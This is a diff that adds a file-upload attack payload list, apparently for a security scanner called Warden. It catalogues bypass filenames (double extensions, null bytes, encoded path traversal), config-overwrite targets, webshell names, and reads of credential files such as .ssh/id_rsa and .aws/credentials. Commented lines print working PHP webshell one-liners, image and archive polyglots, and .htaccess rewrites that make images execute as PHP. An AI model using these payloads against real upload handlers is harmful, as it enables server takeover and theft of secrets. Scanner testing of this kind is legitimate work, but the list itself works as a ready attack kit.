@@ -1,0 +1,358 @@
+# File Upload Vulnerability Payloads
+# Warden v0.8.0 Enterprise Edition
+# Categories: MIME bypass, webshell, filename manipulation, executable extensions
+
+# ============================================================================
+# MIME TYPE BYPASS - Double Extensions
+# ============================================================================
+shell.php.jpg
+shell.php.jpeg
+shell.php.png
+shell.php.gif
+shell.php.bmp
+shell.php.webp
+shell.php.svg
+shell.jsp.jpg
+shell.jsp.png
+shell.aspx.jpg
+shell.aspx.png
+shell.asp.jpg
+shell.asp.png
+webshell.php.txt
+cmd.php.doc
+payload.php.pdf
+shell.js.jpg
+shell.html.jpg
+evil.php.css
+backdoor.php.svg
+test.php.html
+upload.php.txt
+file.php.md
+
+# ============================================================================
+# NULL BYTE INJECTION
+# ============================================================================
+shell.php%00.jpg
+shell.php%00.png
+shell.php%00.gif
+shell.php%00.jpeg
+shell.php%00.bmp
+test.php%00.jpg
+webshell.php%00.png
+cmd.jsp%00.jpg
+evil.aspx%00.png
+shell.asp%00.gif
+upload.php%00.jpg
+file.php%00.png
+image.php%00.jpeg
+avatar.php%00.gif
+photo.php%00.bmp
+
+# ============================================================================
+# TRIPLE EXTENSIONS
+# ============================================================================
+shell.php.jpg.txt
+shell.jpg.php.png
+file.php.txt.jpg
+image.png.php.gif
+photo.jpeg.php.txt
+avatar.gif.php.jpg
+test.php.png.jpg
+evil.php.gif.png
+webshell.jpg.php.txt
+upload.png.php.jpeg
+
+# ============================================================================
+# REVERSED EXTENSIONS
+# ============================================================================
+jpg.php
+jpeg.php
+png.php
+gif.php
+bmp.php
+jpg.jsp
+png.aspx
+gif.asp
+jpg.phtml
+jpeg.php5
+png.php7
+
+# ============================================================================
+# ALTERNATIVE CONTENT-TYPE WITH EXECUTABLE EXTENSION
+# ============================================================================
+shell.php
+webshell.php
+cmd.php
+backdoor.php
+evil.php
+test.php
+upload.php
+shell.jsp
+cmd.jsp
+shell.aspx
+shell.asp
+test.aspx
+test.asp
+shell.phtml
+webshell.php5
+cmd.php7
+evil.php8
+
+# ============================================================================
+# CASE VARIATION BYPASS
+# ============================================================================
+shell.PHP
+shell.Php
+shell.PhP
+webshell.PHP
+upload.PHP
+shell.JSP
+shell.ASPX
+shell.ASP
+shell.PHTML
+evil.PHP
+cmd.PHP
+
+# ============================================================================
+# UNICODE NORMALIZATION BYPASS
+# ============================================================================
+..%c0%af..%c0%afshell.php
+..%c1%9c..%c1%9cevil.php
+..%c0%af..%c0%af..%c0%afevil.jsp
+..%f0%80%80%af..%f0%80%80%afshell.php
+..%u2215..%u2215evil.php
+..%e2%88%92..%e2%88%92shell.php
+shell%e2%88%92php
+evil%u2215php
+
+# ============================================================================
+# DOUBLE ENCODING
+# ============================================================================
+..%252f..%252fshell.php
+..%255c..%255cevil.jsp
+%252e%252e%252fshell.jsp
+..%2525252f..%2525252fupload.php
+shell%252e%252e%252fphp
+%252e%252e%252f
+
+# ============================================================================
+# PATH TRAVERSAL IN FILENAME
+# ============================================================================
+../../evil.php
+../../../shell.php
+../../../../../../etc/passwd
+..\\..\\evil.php
+..\\..\\..\\shell.jsp
+./../../upload.php
+.\\..\\..\\upload.aspx
+../shell.php
+../../config.php
+../../../.env
+../../.htaccess
+../web.config
+../../httpd.conf
+
+# ============================================================================
+# OVERWRITE ATTEMPTS - Sensitive Files
+# ============================================================================
+.htaccess
+.htaccess.php
+..htaccess
+web.config
+..web.config
+web.config.php
+httpd.conf
+apache2.conf
+nginx.conf
+my.cnf
+wp-config.php
+configuration.php
+config.inc.php
+settings.php
+database.yml
+application.properties
+.env
+.env.local
+
+# ============================================================================
+# PHP WEBHELL VARIANTS
+# ============================================================================
+shell.php
+webshell.php
+cmd.php
+c99.php
+r57.php
+symshell.php
+webshell.phtml
+webshell.php3
+webshell.php4
+webshell.php5
+webshell.php7
+webshell.php8
+uploadify.php
+uploader.php
+
+# ============================================================================
+# JSP WEBHELL VARIANTS
+# ============================================================================
+shell.jsp
+cmd.jsp
+webshell.jsp
+jspshell.jsp
+upload.jsp
+fileupload.jsp
+shell.jspx
+cmd.jspx
+
+# ============================================================================
+# ASPX WEBHELL VARIANTS
+# ============================================================================
+shell.aspx
+cmd.aspx
+webshell.aspx
+upload.aspx
+fileupload.aspx
+shell.asmx
+cmd.asmx
+shell.ashx
+cmd.ashx
+
+# ============================================================================
+# ASP WEBHELL VARIANTS
+# ============================================================================
+shell.asp
+cmd.asp
+webshell.asp
+upload.asp
+shell.cer
+cmd.cer
+shell.asa
+cmd.asa
+
+# ============================================================================
+# WINDOWS EXECUTABLES
+# ============================================================================
+shell.exe
+cmd.exe
+payload.exe
+upload.exe
+evil.dll
+payload.dll
+shell.bat
+cmd.bat
+evil.bat
+shell.cmd
+evil.cmd
+shell.vbs
+evil.vbs
+shell.ps1
+evil.ps1
+
+# ============================================================================
+# UNIX/LINUX SCRIPTS
+# ============================================================================
+shell.sh
+cmd.sh
+evil.sh
+backdoor.sh
+shell.bash
+evil.bash
+shell.ksh
+evil.ksh
+shell.csh
+shell.tcsh
+shell.pl
+evil.pl
+shell.py
+evil.py
+shell.rb
+evil.rb
+shell.cgi
+evil.cgi
+
+# ============================================================================
+# DOTFILES AND CONFIGURATION
+# ../../../.ssh/id_rsa
+# ../../../.ssh/authorized_keys
+# ../../../.aws/credentials
+# ../../../.gnupg/secring.gpgs
+# ============================================================================
+
+# ============================================================================
+# CHUNKED ENCODING BYPASS ATTEMPTS
+# Transfer-Encoding: chunked
+# Content-Length: 0
+# ============================================================================
+
+# ============================================================================
+# SPECIAL CHARACTER INSERTION
+# ============================================================================
+shell.php.
+.shell.php
+shell.php..
+shell.php...
+shell.php
+shell.php%20
+shell.php%09
+shell.php%0a
+shell.php%0d
+shell.php .
+shell.php .jpg
+
+# ============================================================================
+# ALTERNATIVE DATA STREAMS (Windows)
+# ============================================================================
+shell.php::$DATA
+shell.php::$INDEX_ALLOCATION
+shell.php:foo.jpg
+shell.php:bar.txt
+
+# ============================================================================
+# MIME TYPE CONFUSION
+# (filename:content-type pairs)
+# shell.php:image/jpeg
+# shell.php:image/png
+# shell.php:image/gif
+# shell.php:application/octet-stream
+# shell.php:text/plain
+# shell.php:application/x-php
+# shell.php:application/x-sh
+# shell.php:image/svg+xml
+# ============================================================================
+
+# ============================================================================
+# POLYGLOT FILES
+# GIF89<?php system($_GET['c']); ?>
+# <?php system($_GET['c']); ?>GIF89
+# Rar!<?php system($_GET['c']); ?>
+# PK<?php system($_GET['c']); ?>  (ZIP polyglot)
+# ============================================================================
+
+# ============================================================================
+# HTACCESS PHP WRAPPER
+.htaccess with: AddType application/x-httpd-php .jpg
+.htaccess with: AddHandler application/x-httpd-php .jpg
+.htaccess with: AddType application/x-httpd-php .png
+
+# ============================================================================
+# DOT PHP PREFIX
+# ============================================================================
+.php.shell
+.php.jpg
+.php.png
+.php.gif
+.php.txt
+
+# ============================================================================
+# PHP TAGS OBFUSCATION
+# (content tests)
+# <?php system('whoami'); ?>
+# <?= system('whoami'); ?>
+# <% system('whoami'); %>
+# <script language="php">system('whoami');</script>
+# <? system('whoami'); ?>
+# <?=`whoami`?>
+# ============================================================================
+
+# END OF FILE UPLOAD PAYLOADS
+# Total: ~250 payloads for comprehensive testing
